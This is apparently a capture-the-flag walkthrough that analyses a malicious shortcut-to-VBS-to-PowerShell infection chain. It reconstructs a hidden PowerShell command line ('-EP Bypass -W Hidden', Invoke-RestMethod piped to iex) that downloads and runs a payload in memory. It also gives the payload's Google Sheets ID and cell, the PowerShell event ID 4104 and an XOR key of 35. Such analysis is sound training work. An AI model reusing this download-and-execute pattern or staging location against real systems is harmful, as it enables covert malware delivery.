<img width="706" height="646" alt="image" src="https://github.com/user-attachments/assets/45f9d6a1-6739-4891-962c-8a1f469172c6" />


<img width="1028" height="219" alt="image" src="https://github.com/user-attachments/assets/06edfd82-43d2-431a-a32b-2b0893f62722" />

> *What program is being copied, renamed, and what is the final name? (Eg: notepad.exe:picture.jpeg)*
> 

<img width="1196" height="193" alt="image" src="https://github.com/user-attachments/assets/12fb6b00-9aad-497a-abcd-3b5f27a33a2a" />

This shows the `.lnk` runs PowerShell which copies `cscript.exe` to `calc.exe` and executes `calc.exe Invoice.vbs`.

`cscript.exe:calc.exe`  is the asnwer

> What is the name of the function that is used for deobfuscating the strings, in the VBS script? (Eg: funcName)
> 

<img width="960" height="604" alt="image" src="https://github.com/user-attachments/assets/8deaeca7-fef1-41b3-85e4-3da14ae4682f" />

<img width="998" height="484" alt="image" src="https://github.com/user-attachments/assets/b1e2c62c-25b8-4d39-a0ec-9ddaa38314bf" />

`LLdunAaXwVgKfowf` extracts lowercase letters — used to reconstruct PowerShell path and arguments.

*What program is used for executing the next stage? (Eg: notepad.exe)*     

<img width="994" height="448" alt="image" src="https://github.com/user-attachments/assets/64cc55f7-d0c3-4de7-88bd-f994cdf19fd4" />

- The VBS deobfuscator `LLdunAaXwVgKfowf` keeps *only lowercase letters* from the obfuscated strings.
- Applying that to the pieces used to build `yNSlalZeGAsokjsP` yields (reconstructed, lowercase-only):
    
    `cwindowssystem32windowspowershellv1.0powershellexe` → i.e. `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
    
- The script then sets `cMtARTHTmbqbxauA` to that path plus an argument string (you can see `objShell.Run cMtARTHTmbqbxauA` at line 17). The deobfuscated argument contains `epbypasswhiddenc` (i.e. `EP Bypass -W Hidden -C`) and `invoke-restmethod ... | iex` behavior (download base64 payload, convert/decode, decompress into memory and execute).

What the script actually runs (reconstructed, human readable form) is roughly:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EP Bypass -W Hidden -C "<Invoke-RestMethod ...
```

Answer: **`powershell.exe`**

> What is the Spreadsheet ID the malicious actor downloads the next stage from? (Eg: U3ByZWFkU2hlZXQgSUQK)
> 

<img width="1185" height="569" alt="image" src="https://github.com/user-attachments/assets/6de11ec3-3b78-4e7c-b42e-dfad1cdadbcc" />

<img width="1007" height="563" alt="image" src="https://github.com/user-attachments/assets/193b0d9a-a681-4377-8506-bee479d3d40e" />

`1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ`

> *What is the Sheet Name and Cell Number that houses the payload? (Eg: Sheet1:A1)*         
Parse the URL query parameter `ranges=Sheet1!O37`
> 

Sheet1:O37 

<img width="1000" height="59" alt="image" src="https://github.com/user-attachments/assets/f8cf44f4-c098-4aae-9d2a-d43f710fce74" />

*What is the Event ID that relates to Powershell execution? (Eg: 5991)*

Inspect event logs; PowerShell scriptblocks show under `Microsoft-Windows-PowerShell/Operational` with EventID **4104**.

<img width="1180" height="538" alt="image" src="https://github.com/user-attachments/assets/1b13dc89-c4c8-4beb-9775-70c889bf8f25" />

`*4104*`

> In the final payload, what is the XOR Key used to decrypt the shellcode? (Eg: 1337)
> 

<img width="1085" height="411" alt="image" src="https://github.com/user-attachments/assets/34a4c613-e397-4681-8745-d9e3bffb57b5" />

**XOR key used to decrypt final payload**

- Look at the in-memory loader: `for (...) { $var_code[$x] = $var_code[$x] -bxor 35 }`
- Report: `35 (0x23)`

<img width="704" height="60" alt="image" src="https://github.com/user-attachments/assets/63e90dc7-9d4f-4ddb-be96-22c6ddf81d1f" />

thats the flag
